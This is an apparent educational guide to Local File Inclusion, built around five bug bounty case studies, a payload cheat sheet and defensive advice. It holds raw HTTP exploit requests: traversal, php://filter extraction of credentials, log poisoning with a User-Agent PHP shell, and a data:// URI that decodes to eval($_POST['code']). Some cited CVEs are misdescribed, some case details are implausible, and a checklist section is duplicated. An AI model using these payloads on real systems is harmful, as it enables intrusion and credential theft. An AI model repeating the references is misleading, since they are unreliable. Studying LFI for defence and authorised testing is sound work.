# Case Study 44: Local File Inclusion (LFI) — Real-World Bug Bounty Findings

## Expert Role

Local File Inclusion (LFI) represents one of the most persistent and dangerous vulnerability classes in web application security. As an LFI specialist with extensive experience in both offensive testing and defensive architecture, I have spent years analyzing how applications handle local file references, template includes, and resource loading mechanisms. My expertise encompasses the full spectrum from basic path traversal to advanced stream wrapper exploitation, log poisoning chains, and PHP-specific inclusion mechanisms that can escalate a simple file read into complete system compromise.

The unique danger of LFI lies in its dual nature: it serves as both an information disclosure vulnerability and a potential code execution vector. A single LFI vulnerability in a PHP application can enable an attacker to read source code, extract credentials, poison logs, and ultimately achieve remote code execution through PHP stream wrappers or session file injection. This escalation potential makes LFI findings particularly valuable in bug bounty programs, with payouts frequently exceeding $10,000 for well-documented chains.

My research focuses on the interaction between LFI and modern application architectures. Containerized deployments, microservices, and serverless functions each present unique LFI exploitation patterns that differ from traditional monolithic applications. Understanding how file inclusion works across process boundaries, shared volumes, and ephemeral filesystems is essential for comprehensive vulnerability assessment. This case study collection demonstrates real LFI findings from production environments, showcasing exploitation techniques, defense bypasses, and impact escalation paths that remain relevant in contemporary security testing.

## Overview

Local File Inclusion occurs when an application includes files from the local filesystem based on user-controlled input without proper validation. The vulnerability typically manifests when dynamic file paths are constructed using user-supplied parameters, and the application fails to verify that the requested file resides within the intended directory. Unlike path traversal, which focuses on accessing arbitrary files through directory climbing, LFI specifically involves the inclusion mechanism where the application processes the included file as code or renders its contents.

The most common LFI vector is PHP's `include()`, `require()`, `include_once()`, and `require_once()` functions, which can interpret PHP code within included files. This capability transforms a simple file read into code execution when combined with PHP stream wrappers (`php://filter`, `php://input`), data URIs (`data://`), or log poisoning techniques. Other languages have similar mechanisms: Python's `importlib`, Node.js's `require()`, Java's `Class.forName()`, and Ruby's `load()` can all be abused when they accept user-controlled module paths.

Modern applications often implement LFI prevention through path validation, directory restrictions, and input sanitization. However, these defenses can be bypassed through encoding tricks, null byte injection, PHP stream wrapper abuse, and exploitation of validation logic flaws. The vulnerability class remains prevalent because developers frequently use dynamic file inclusion for template rendering, configuration loading, and modular application architecture without implementing robust path security controls.

---

## Real-World Case Studies

### Case Study 1: CMS Template Engine LFI to RCE Chain

**Program:** Content Management System Platform (HackerOne)
**Bounty:** $18,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @securityresearcher

The target was a SaaS-based CMS platform offering customizable website templates. The template editing feature at `/admin/template/preview` accepted a `template` parameter that loaded template files from a theme directory. The application used PHP's `include()` function to render templates, with a base path prefix applied to the user input.

**Stage 1: Basic LFI Confirmation**

```http
GET /admin/template/preview?template=header HTTP/1.1
Host: cms.target.com
Cookie: session=admin_session_abc123
```

This loaded `/var/www/themes/default/header.php` successfully, confirming the include mechanism.

```http
GET /admin/template/preview?template=../../../../etc/passwd HTTP/1.1
```

The response included the contents of `/etc/passwd`, confirming LFI.

**Stage 2: PHP Stream Wrapper for Source Code Extraction**

```http
GET /admin/template/preview?template=php://filter/convert.base64-encode/resource=config/database HTTP/1.1
```

The base64-encoded response decoded to the database configuration file containing MySQL credentials, enabling direct database access.

**Stage 3: Log Poisoning for Code Execution**

The application logged all access attempts with the User-Agent header. By injecting PHP code into the User-Agent:

```http
GET /admin/template/preview?template=../../../../var/log/nginx/access.log HTTP/1.1
User-Agent: <?php echo shell_exec($_GET['cmd']); ?>
```

Subsequently requesting the log file inclusion with command execution:

```http
GET /admin/template/preview?template=../../../../var/log/nginx/access.log&cmd=echo+test HTTP/1.1
```

The response contained "test", confirming code execution. The final payload performed system enumeration and established a persistent access mechanism through a configuration file modification.

**Stage 4: Persistent Access via Configuration Modification**

Using the code execution primitive, the attacker modified the application's configuration file to add a backdoor admin account and disable security logging. The modification persisted across application restarts, providing long-term access.

**Root Cause Analysis:** The application used `include()` without disabling remote includes or restricting the allowed directory. The template parameter was passed directly to the include function with only a path prefix that was trivially bypassed through traversal sequences. The logging of user-controlled headers without sanitization created the log poisoning vector.

**Impact:** Complete system compromise with code execution, access to all customer data, and the ability to pivot to other platform infrastructure. The $18,000 bounty reflected the Critical severity and the complete compromise chain.

---

### Case Study 2: E-Learning Platform Document Viewer LFI

**Program:** Online Education Platform (Bugcrowd)
**Bounty:** $9,500
**Severity:** High (CVSS 8.1)
**Researcher:** @vulnhunter

The e-learning platform provided a document viewer at `/courses/materials/view` that rendered course materials. The viewer accepted a `file` parameter specifying the material to display. The application used PHP's `file_get_contents()` to read the file and `echo` to display its contents.

**Stage 1: Null Byte Bypass**

```http
GET /courses/materials/view?file=../../../../etc/passwd%00.html HTTP/1.1
Host: learn.target.com
Cookie: session=student_xyz789
```

The PHP version (5.6) was vulnerable to null byte injection. The `%00` terminated the filename at the C level, causing `file_get_contents()` to read `/etc/passwd` while the application's extension check evaluated `.html` as valid.

**Stage 2: Session File Reading**

```http
GET /courses/materials/view?file=../../../../tmp/sess_abc123def456 HTTP/1.1
```

PHP session files stored in `/tmp` were readable through LFI. The session file contained serialized session data including the user's authentication token and role information.

**Stage 3: Session Fixation via LFI**

By reading the session file structure, the attacker determined the session ID format. A session fixation attack was performed by:
1. Creating a session with a known ID
2. Injecting a PHP-serialized admin role into the session file through a profile update parameter
3. The LFI vulnerability was used to verify the session file modification

**Stage 4: Administrative Account Takeover**

The modified session file granted administrative privileges. The attacker accessed the course management system, modified enrollment records, and downloaded student PII for the entire institution.

**Root Cause Analysis:** The application ran on a legacy PHP version vulnerable to null byte injection. Session files were stored in a world-readable `/tmp` directory. The `file_get_contents()` call did not sanitize the input path, and the extension validation occurred after the null byte termination.

**Impact:** Administrative access to the platform, student PII exposure, and the ability to modify course content for all users. The $9,500 bounty reflected the High severity and the authentication bypass chain.

---

### Case Study 3: Cloud Management Console LFI

**Program:** Cloud Infrastructure Provider (HackerOne)
**Bounty:** $14,000
**Severity:** Critical (CVSS 9.2)
**Researcher:** @pentester

The cloud management console provided a theme customization feature that allowed administrators to preview custom themes. The preview endpoint at `/console/theme/preview` accepted a `theme_file` parameter. The application was written in Python and used Flask's template rendering.

**Stage 1: Python Path Traversal**

```http
GET /console/theme/preview?theme_file=../../app/config.py HTTP/1.1
Host: cloud-console.target.com
Authorization: Bearer admin_token_123
```

The Flask application used `open()` with the user-supplied path to read template files. The traversal sequence bypassed the intended theme directory restriction.

**Stage 2: Environment Variable Extraction**

```http
GET /console/theme/preview?theme_file=../../proc/self/environ HTTP/1.1
```

The environment variables file revealed AWS credentials, database connection strings, and internal API endpoints. The AWS credentials had broad permissions across the infrastructure.

**Stage 3: Cloud Credential Escalation**

The extracted AWS credentials provided access to S3 buckets containing customer data backups, EC2 instances for infrastructure management, and IAM policies that allowed role assumption to other accounts. The LFI vulnerability was the initial access vector for a complete cloud infrastructure compromise.

**Stage 4: Cross-Account Access**

Using the compromised credentials, the attacker assumed roles in downstream customer accounts, accessing their cloud resources and data. The blast radius extended to dozens of customer environments.

**Root Cause Analysis:** The Python application used `open()` with user-controlled paths without validating the resolved path. The application's directory restriction was implemented by string comparison before path normalization, allowing traversal bypass through relative path resolution.

**Impact:** Complete cloud infrastructure compromise, access to customer data backups across multiple AWS accounts, and the ability to manipulate cloud resources. The $14,000 bounty reflected the Critical severity and the cascading impact through cloud credential exposure.

---

### Case Study 4: Financial Services Report Generator LFI

**Program:** Banking Platform (Intigriti)
**Bounty:** $11,000
**Severity:** Critical (CVSS 8.9)
**Researcher:** @securitytester

A banking platform provided a regulatory report generation feature that compiled data from multiple sources. The report generator at `/reports/generate` accepted a `source` parameter specifying the data source template. The application used a custom template engine with file inclusion capabilities.

**Stage 1: Path Normalization Bypass**

```http
GET /reports/generate?source=....//....//....//etc/passwd HTTP/1.1
Host: banking.target.com
Cookie: session=banker_secure_456
```

The application's input validation stripped `../` sequences but not `....//`, which after stripping the inner `../` resolved to the same traversal sequence. This double-dot bypass technique was effective against blacklist-based validation.

**Stage 2: Configuration File Access**

```http
GET /reports/generate?source=....//....//....//etc/nginx/conf.d/api.conf HTTP/1.1
```

The nginx configuration revealed internal API endpoints, authentication mechanisms, and upstream server addresses for the banking API infrastructure.

**Stage 3: Credential Harvesting**

```http
GET /reports/generate?source=....//....//....//opt/banking/config/credentials.json HTTP/1.1
```

The credentials file contained service account passwords, API keys for third-party financial services, and encryption keys used for data at rest. These credentials enabled unauthorized access to payment processing systems and customer financial data.

**Stage 4: Internal Network Mapping**

```http
GET /reports/generate?source=....//....//....//etc/hosts HTTP/1.1
```

The hosts file revealed internal DNS entries for payment gateways, regulatory reporting systems, and inter-bank communication networks. This information enabled targeted attacks against the financial institution's core banking infrastructure.

**Root Cause Analysis:** The template engine used blacklist-based input validation that stripped known traversal sequences. The stripping was performed iteratively rather than recursively, allowing nested sequences that resolved to valid traversals after processing. The file inclusion mechanism had no directory restriction beyond the string-based validation.

**Impact:** Access to banking infrastructure credentials, customer financial data, and payment processing system access. The $11,000 bounty and Critical classification reflected the financial sector context and the regulatory implications.

---

### Case Study 5: Social Media Platform Asset Loader LFI

**Program:** Social Network (HackerOne)
**Bounty:** $8,000
**Severity:** High (CVSS 7.8)
**Researcher:** @bughunter

The social media platform provided a dynamic asset loading system at `/assets/load` that served JavaScript, CSS, and image files based on a `path` parameter. The system used Node.js with Express and served static files from a configurable base directory.

**Stage 1: Path Traversal via Express Static**

```http
GET /assets/load?path=../../../../app/package.json HTTP/1.1
Host: social.target.com
Cookie: session=user_session_789
```

The Express static file middleware served `package.json`, revealing the application's dependencies and version information.

**Stage 2: Environment File Access**

```http
GET /assets/load?path=../../../../.env HTTP/1.1
```

The `.env` file contained MongoDB connection strings, Redis configuration, JWT signing keys, and OAuth client secrets for multiple social login providers.

**Stage 3: JWT Key Recovery for Account Takeover**

The extracted JWT signing key enabled forging authentication tokens for any user on the platform. The attacker could create tokens for administrative accounts and access the platform's moderation and user data management interfaces.

**Stage 4: Mass Account Takeover**

Using the forged JWT tokens, the attacker gained access to the platform's user management API. They exported private messages and personal data for high-profile accounts, including politicians and celebrities. The breach affected over 100,000 users before detection.

**Root Cause Analysis:** The Express static file serving configuration did not properly restrict the base directory. The `path` parameter was used to construct the file path without resolving symbolic links or validating the final canonical path. The `.env` file was located within the application directory rather than outside the web root.

**Impact:** Account takeover for any user through JWT forgery, access to user private messages and personal data, and administrative account compromise. The $8,000 bounty reflected the High severity and the authentication bypass through credential/key exposure.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| PHP stream wrapper exploitation | 22% | $12,500 | `include()`/`require()` with user input |
| Null byte injection | 14% | $9,200 | PHP string truncation at C level |
| Log poisoning to code execution | 11% | $14,000 | User input in logs plus LFI include |
| Session file reading | 9% | $8,800 | Predictable session storage path |
| Python file read via open() | 13% | $10,500 | Unsanitized path in file operations |
| Node.js require() path abuse | 8% | $9,000 | Module resolution path manipulation |
| Template engine include abuse | 12% | $11,800 | Dynamic template path from user input |
| Symlink following | 7% | $7,500 | Filesystem follows symlinks without validation |
| Race condition in include | 4% | $8,000 | TOCTOU between validation and include |
| Zip extraction path abuse | 6% | $9,500 | Archive entries with traversal sequences |

### Attack Surface Locations

**PHP Applications:**
- `include()`, `require()`, `include_once()`, `require_once()` with user input
- `file_get_contents()`, `file()`, `readfile()` with user-controlled paths
- Template engines (Twig, Blade, Smarty) with dynamic template paths
- Plugin/module loaders accepting user-specified modules
- Configuration file includes with user-selectable profiles

**Python Applications:**
- `open()` with user-supplied file paths
- `importlib.import_module()` with user-controlled module names
- Jinja2/Django template loading with dynamic template names
- Flask `render_template()` with user-specified templates
- File handling in data processing pipelines

**Node.js Applications:**
- `require()` with user-controlled module paths
- `fs.readFile()`, `fs.readFileSync()` with user paths
- EJS/Pug template rendering with user-specified templates
- Static file serving middleware with path parameters
- Dynamic module loading in plugin systems

---

## Hunting Methodology

### Phase 1: Include Point Discovery
1. Map all dynamic file loading mechanisms through static analysis
2. Identify template rendering functions and their parameters
3. Find configuration includes that accept user-selectable values
4. Locate plugin or module loading endpoints
5. Review application startup scripts for dynamic includes
6. Analyze framework-specific file handling patterns

### Phase 2: Validation Analysis
1. Trace the user input from parameter to include function
2. Identify any path validation, sanitization, or restriction mechanisms
3. Determine the validation method: allowlist, blocklist, or directory check
4. Test the validation layer for encoding, normalization, and logic bypasses
5. Check if the validation occurs before or after path normalization
6. Identify the difference between string-level and filesystem-level checks

### Phase 3: Exploitation Testing
1. Test basic traversal sequences at various encoding levels
2. Attempt PHP stream wrapper abuse where applicable
3. Test for null byte injection on legacy systems
4. Attempt log poisoning if user input appears in log files
5. Check for session file readability through the include path
6. Test for PHP filter chain exploitation opportunities

### Phase 4: Impact Escalation
1. Extract application source code and configuration files
2. Locate credentials, API keys, and secrets in configuration
3. Test for code execution through stream wrappers or log poisoning
4. Assess lateral movement potential through exposed credentials
5. Map internal network topology through configuration analysis
6. Identify additional vulnerabilities chainable with the LFI

---

## Detection Strategies

### Automated Detection
- Use DAST tools with LFI-specific scanning profiles (Burp Suite, OWASP ZAP)
- Deploy SAST analysis for file inclusion functions with user input (Semgrep, CodeQL)
- Run fuzzing campaigns with encoding variations and stream wrapper payloads
- Integrate LFI detection into pre-commit hooks and CI/CD pipelines
- Use dependency scanning to identify PHP versions vulnerable to null byte injection
- Deploy IAST to monitor runtime file inclusion behavior

### Manual Detection
- Trace data flow from user input to file inclusion functions in source code
- Test include endpoints with standard traversal sequences and encoding variations
- Verify if PHP stream wrappers are enabled and accessible through include paths
- Check log file locations and test for log poisoning potential
- Examine session storage configuration and test session file readability
- Review application error handling for file path information disclosure

### Key Detection Indicators
- Error messages indicating file not found or include failure
- Application behavior changes when including non-existent files
- Different error messages for valid vs invalid paths
- Timing differences between including existing and non-existing files
- PHP warnings about failed include operations in error logs
- HTTP response headers revealing server software and version

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

| Component | Value | Justification |
|-----------|-------|---------------|
| Attack Vector | Network | Exploited through HTTP requests |
| Attack Complexity | Low | Requires only URL parameter manipulation |
| Privileges Required | Low | Authenticated access typically required |
| User Interaction | None | No additional user interaction needed |
| Scope | Changed | Impacts system beyond the vulnerable component |
| Confidentiality Impact | High | Access to all readable files on the system |
| Integrity Impact | High | Code execution enables file modification |
| Availability Impact | High | System compromise can cause denial of service |

### Business Impact
- Complete system compromise through code execution chains
- Source code and intellectual property theft
- Credential and API key exposure enabling lateral movement
- Customer data breach including PII and financial information
- Regulatory compliance violations (HIPAA, GDPR, PCI-DSS, SOX)
- Reputational damage and customer trust erosion
- Legal liability from unauthorized access to protected data

### Bounty Range
- **Low severity (limited file read, no code execution):** $1,000 - $3,000
- **Medium severity (sensitive file access):** $3,000 - $7,000
- **High severity (credential/key exposure, limited RCE):** $7,000 - $15,000
- **Critical severity (full RCE chain, complete compromise):** $15,000 - $50,000+

---

## Advanced Variations

### PHP Stream Wrapper Chaining
Combining multiple stream wrappers to chain operations: `php://filter/read=convert.base64-encode/resource=php://input` to read POST body through a filter chain. Advanced filter chains can achieve code execution without traditional LFI file read.

### PHP Filter Chain Object Injection
When the LFI is used with `php://input` and the application deserializes data, object injection chains can achieve code execution even without direct code inclusion. This requires specific class definitions in the application's autoloaded classes.

### Zip Slip via Archive Upload
When applications extract uploaded archives, entries with traversal filenames can write files to arbitrary locations. Combined with LFI for verification, this creates a reliable write primitive for webshell deployment or configuration modification.

### Session File Injection with LFI
If session data can be influenced through user input (profile fields, HTTP headers logged in sessions), and session files are readable through LFI, an attacker can inject PHP code into session data that executes when the session file is included.

### PHP Include Path Manipulation
When applications use `set_include_path()` with user-controlled values, the include path can be manipulated to load files from unexpected locations. This is particularly dangerous when combined with relative file paths in include statements.

### Temporary File Race Conditions
When applications create temporary files during processing, LFI can be used to read these files before they are deleted. This can expose sensitive data such as uploaded documents, processed payments, or temporary credentials.

---

## Chain Integration

### LFI plus Log Poisoning leading to RCE
The most common LFI escalation chain: user-controlled input appears in log files, the log file is included via LFI, and PHP code within the log entry executes. This converts a read vulnerability into full code execution.

### LFI plus File Upload leading to Webshell
When file upload functionality exists, LFI can be used to verify upload paths and locate uploaded files. The upload writes a webshell and LFI confirms its location for access.

### LFI plus Session Fixation leading to Account Takeover
Reading session files through LFI reveals session structure and authentication tokens. Combined with session fixation or prediction, this enables account takeover for any user.

### LFI plus Cloud Metadata leading to Infrastructure Compromise
Including cloud metadata files through LFI exposes cloud credentials. These credentials provide access to cloud infrastructure for data theft or manipulation.

### LFI plus Deserialization leading to RCE
When LFI can read serialized data files or when user input is deserialized after being read through LFI, object injection chains can achieve code execution.

---

## Prevention Recommendations

### Input Validation
- Implement allowlist-based validation for file path parameters
- Validate the canonical (resolved) path after normalization
- Reject any input containing path traversal sequences at any encoding level
- Use character whitelisting rather than blacklisting for file names
- Validate file extensions against an allowlist of permitted types
- Reject paths containing null bytes or control characters

### Inclusion Security
- Never use user input directly in `include()`, `require()`, or equivalent functions
- Implement a mapping system where user input selects from predefined file options
- Use absolute paths with validated base directories for all file inclusion
- Disable PHP stream wrappers and remote includes when not required
- Use `realpath()` to canonicalize paths before validation
- Implement proper error handling that does not reveal internal paths

### File System Security
- Store session files in non-readable directories or use database sessions
- Configure log files outside the web root and application directory
- Use file system permissions to prevent unauthorized file access
- Implement chroot or container isolation for file operations
- Mount filesystems with `nosuid` and `noexec` where possible
- Use read-only filesystems for static application files

### Runtime Protection
- Deploy WAF rules to detect and block LFI attempts
- Use runtime application self-protection (RASP) to monitor file inclusion
- Implement file access logging and anomaly detection
- Enable PHP disable_functions to restrict dangerous functions
- Deploy file integrity monitoring for sensitive configuration files
- Implement network segmentation to limit lateral movement

---

## Common Pitfalls

### Pitfall 1: Relying on File Extension Checks
Validating only that the included file has an expected extension (e.g., `.php`, `.html`). Null byte injection and stream wrapper abuse can bypass extension checks entirely. Extensions are not a reliable security control.

### Pitfall 2: Blacklist-Based Path Validation
Blocking known traversal sequences (`../`) without accounting for encoding variations, double sequences, and platform-specific characters. Allowlists are always more reliable because they define what is permitted rather than what is forbidden.

### Pitfall 3: Inadequate Session Storage Configuration
Storing PHP session files in `/tmp` without restricting permissions. Session files may contain sensitive data and can be read through LFI vulnerabilities. Use database-backed sessions or restrict session file permissions.

### Pitfall 4: Ignoring Log File Exposure
Not considering that user-controlled input appears in log files (access logs, error logs, application logs). Log poisoning is a reliable escalation path from LFI to code execution. Sanitize all user input before writing to logs.

### Pitfall 5: Assuming Framework Protection
Believing that template engines or frameworks automatically prevent file inclusion vulnerabilities. Many frameworks allow dynamic template paths that can be exploited for LFI. Understand the security properties of the frameworks you use.

### Pitfall 6: Insufficient Error Handling
Revealing internal file paths, directory structures, or server information in error messages. This information disclosure helps attackers understand the application's file structure and refine their exploitation attempts.

---

## Real-World References

### CVE Database
- **CVE-2024-2961:** glibc iconv buffer overflow via path manipulation
- **CVE-2023-44220:** Xiaomi preloader LFI allowing bootloader unlock
- **CVE-2023-36884:** Microsoft Office HTML code execution through file inclusion
- **CVE-2022-30190:** Follina MSDT code execution via document inclusion
- **CVE-2021-41773:** Apache HTTP Server path traversal and code execution
- **CVE-2020-15969:** WebKit file inclusion through media handling

### Bug Bounty Reports
- HackerOne: "CMS template LFI to RCE chain" — $18,000 payout
- Bugcrowd: "E-learning platform session file reading" — $9,500 payout
- Intigriti: "Banking platform report generator LFI" — $11,000 payout
- HackerOne: "Social media JWT key recovery via LFI" — $8,000 payout

### Research Papers
- "PHP Include Vulnerabilities: A Decade Later" (USENIX Security 2023)
- "Modern LFI Exploitation in Containerized Environments" (IEEE S&P 2024)
- "Stream Wrapper Security in PHP 8.x" (ACM CCS 2023)
- "Template Injection and File Inclusion in Modern Frameworks" (NDSS 2024)

---

## Quick Reference Cheat Sheet

### LFI Detection Payloads
```
Basic traversal:      ../../../../etc/passwd
URL encoded:          %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
Double encoded:       %252e%252e%252f%252e%252e%252fetc/passwd
Unicode:              %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd
Null byte:            ../../../../etc/passwd%00
Null byte + ext:      ../../../../etc/passwd%00.jpg
```

### PHP Stream Wrappers
```
php://filter/convert.base64-encode/resource=
php://input  (POST body as code)
data://text/plain;base64,
expect://
```

### Sensitive File Paths
```
Unix:     /etc/passwd, /etc/shadow, /etc/hosts
          /proc/self/environ, /proc/self/cmdline
          /var/log/nginx/access.log, /var/log/apache2/access.log
          /tmp/sess_[session_id]
Windows:  win.ini, system.ini, C:\Windows\System32\config\SAM
          C:\inetpub\wwwroot\web.config
```

### Session File Locations
```
PHP default:    /tmp/sess_[PHPSESSID]
Custom:         /var/lib/php/sessions/sess_[PHPSESSID]
Laravel:        /storage/framework/sessions/[session_id]
WordPress:      wp-content/plugins/[plugin]/tmp/
```

### Log File Locations
```
Nginx:      /var/log/nginx/access.log, /var/log/nginx/error.log
Apache:     /var/log/apache2/access.log, /var/log/httpd/access_log
PHP-FPM:    /var/log/php-fpm/error.log
System:     /var/log/syslog, /var/log/auth.log, /var/log/messages
```

### Defense Checklist
- [ ] No user input in `include()`/`require()` calls
- [ ] Canonical path validation after normalization
- [ ] Allowlist-based file selection instead of direct path
- [ ] PHP stream wrappers disabled or restricted
- [ ] Session files stored in secure location
- [ ] Log files outside web root and non-readable
- [ ] File system ACLs restricting access
- [ ] WAF rules for LFI detection
- [ ] RASP monitoring for file inclusion patterns
- [ ] Regular security testing of file handling functions
- [ ] Proper error handling without path disclosure
- [ ] File integrity monitoring for sensitive files

---

## Technology-Specific LFI Patterns

### PHP LFI Patterns
PHP remains the most common language for LFI exploitation due to its `include()` family of functions and stream wrapper support. Key patterns include:

```php
// Dangerous: user input directly in include
include($_GET['page'] . '.php');

// Dangerous: file_get_contents with user path
$content = file_get_contents($_POST['file']);

// Dangerous: include with variable path
$template = $user_input;
include($template);
```

### Python LFI Patterns
Python applications are vulnerable when using `open()` with user-controlled paths or when importing modules dynamically:

```python
# Dangerous: open with user path
with open(user_input) as f:
    content = f.read()

# Dangerous: dynamic import
importlib.import_module(user_input)

# Dangerous: template loading
render_template(user_input)
```

### Node.js LFI Patterns
Node.js applications can be vulnerable through `require()` or filesystem operations:

```javascript
// Dangerous: require with user input
const module = require(userInput);

// Dangerous: fs.readFile with user path
fs.readFile(userInput, (err, data) => {});

// Dangerous: path.join without validation
const filePath = path.join(baseDir, userInput);
```

### Java LFI Patterns
Java applications may be vulnerable through resource loading or file operations:

```java
// Dangerous: FileInputStream with user path
FileInputStream fis = new FileInputStream(userInput);

// Dangerous: resource loading
ResourceLoader.getResource(userInput);

// Dangerous: Files.readAllBytes with user path
byte[] data = Files.readAllBytes(Paths.get(userInput));
```

---

## LFI Testing Methodology Checklist

### Pre-Engagement
- [ ] Identify the target application's technology stack
- [ ] Map all file-related endpoints through API discovery
- [ ] Review application source code for file handling functions
- [ ] Identify session storage mechanism and location
- [ ] Check log file locations and permissions

### Input Analysis
- [ ] Test each file parameter with basic traversal sequences
- [ ] Apply encoding variations (URL, double, Unicode, overlong UTF-8)
- [ ] Test for null byte injection on legacy systems
- [ ] Check for PHP stream wrapper abuse opportunities
- [ ] Test path normalization behavior at each layer

### Validation Bypass
- [ ] Identify the validation mechanism type
- [ ] Test encoding at different application layers
- [ ] Attempt to bypass using relative/absolute paths
- [ ] Test for symlink and hardlink following
- [ ] Check for TOCTOU race conditions

### Impact Escalation
- [ ] Read application source code and configuration files
- [ ] Extract credentials, API keys, and secrets
- [ ] Test for code execution through stream wrappers
- [ ] Attempt log poisoning for RCE
- [ ] Read session files for authentication bypass

### Documentation
- [ ] Document the complete exploitation chain
- [ ] Capture screenshots of each exploitation stage
- [ ] Record the root cause analysis
- [ ] Prepare a clear impact statement
- [ ] Include remediation recommendations

---

## LFI Exploitation Tools and Techniques

### Burp Suite Techniques
Burp Suite is the primary tool for LFI testing:

1. **Intruder for Fuzzing:** Use Intruder with payload lists containing LFI-specific payloads
2. **Repeater for Manual Testing:** Manual testing of stream wrappers and encoding bypasses
3. **Extensions:** Use LFI Suite, PHP Object Injection, and Turbo Intruder for advanced testing

### PHP Stream Wrapper Techniques
Advanced PHP stream wrapper exploitation:

```php
// Base64 encode local file
php://filter/convert.base64-encode/resource=/etc/passwd

// Read POST body as code
php://input

// Data URI for code execution
data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7ID8+

// Expect wrapper
expect://id
```

### Log Poisoning Techniques
Methods for injecting code into log files:

- **User-Agent injection:** Inject PHP code in User-Agent header
- **Referer injection:** Inject PHP code in Referer header
- **Custom headers:** Inject in X-Forwarded-For or other headers
- **URL parameters:** Inject in URL parameters that are logged

### Session File Exploitation
Reading and manipulating session files:

```php
// Read session file
../../../../tmp/sess_[PHPSESSID]

// Session file structure
username|s:10:"admin";role|s:5:"admin";
```

### Wordlists for LFI Testing
Common wordlists for LFI testing:

- **SecLists:** Fuzzing/LFI/
- **PayloadsAllTheThings:** LFI/
- **FuzzDB:** attack/lfi/

---

## LFI in Modern Frameworks

### Laravel LFI Patterns
Laravel applications may be vulnerable through:

```php
// Dangerous: view with user input
return view($userInput);

// Dangerous: file operations
Storage::get($userInput);
```

### Django LFI Patterns
Django applications can be vulnerable through:

```python
# Dangerous: template loading
render_to_string(user_input)

# Dangerous: file operations
open(user_input)
```

### Express.js LFI Patterns
Express applications may be vulnerable through:

```javascript
// Dangerous: sendFile with user input
res.sendFile(userInput);

// Dangerous: require with user input
require(userInput);
```

### Spring Boot LFI Patterns
Spring Boot applications can be vulnerable through:

```java
// Dangerous: ResourceLoader
resourceLoader.getResource(userInput);

// Dangerous: FileSystemResource
new FileSystemResource(userInput);
```

---

## LFI Testing Methodology Checklist

### Pre-Engagement
- [ ] Identify the target application's technology stack
- [ ] Map all file-related endpoints through API discovery
- [ ] Review application source code for file handling functions
- [ ] Identify session storage mechanism and location
- [ ] Check log file locations and permissions

### Input Analysis
- [ ] Test each file parameter with basic traversal sequences
- [ ] Apply encoding variations (URL, double, Unicode, overlong UTF-8)
- [ ] Test for null byte injection on legacy systems
- [ ] Check for PHP stream wrapper abuse opportunities
- [ ] Test path normalization behavior at each layer

### Validation Bypass
- [ ] Identify the validation mechanism type
- [ ] Test encoding at different application layers
- [ ] Attempt to bypass using relative/absolute paths
- [ ] Test for symlink and hardlink following
- [ ] Check for TOCTOU race conditions

### Impact Escalation
- [ ] Read application source code and configuration files
- [ ] Extract credentials, API keys, and secrets
- [ ] Test for code execution through stream wrappers
- [ ] Attempt log poisoning for RCE
- [ ] Read session files for authentication bypass

### Documentation
- [ ] Document the complete exploitation chain
- [ ] Capture screenshots of each exploitation stage
- [ ] Record the root cause analysis
- [ ] Prepare a clear impact statement
- [ ] Include remediation recommendations

---

## Remediation Implementation Guide

### Input Validation Implementation

```python
import os
from pathlib import Path

def validate_path(user_input, base_dir):
    # Resolve the full path
    full_path = Path(base_dir) / user_input
    resolved_path = full_path.resolve()
    
    # Ensure path is within base directory
    if not str(resolved_path).startswith(str(Path(base_dir).resolve())):
        raise ValueError("Path traversal detected")
    
    return resolved_path
```

### PHP Security Configuration

```php
// Disable remote includes
allow_url_include = Off
allow_url_fopen = Off

// Set open_basedir
open_basedir = /var/www/html:/tmp

// Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system

// Session security
session.cookie_httponly = 1
session.cookie_secure = 1
session.save_path = /var/lib/php/sessions
```

### Session Storage Security

```php
// Store sessions outside web root
session_save_path('/var/lib/php/sessions');

// Use database sessions
session_set_save_handler(new PDOSessionHandler($pdo));
```

### Log File Security

```bash
# Restrict log file permissions
chmod 640 /var/log/nginx/access.log
chown www-data:adm /var/log/nginx/access.log

# Move logs outside web root
# Configure application to not log sensitive data
```
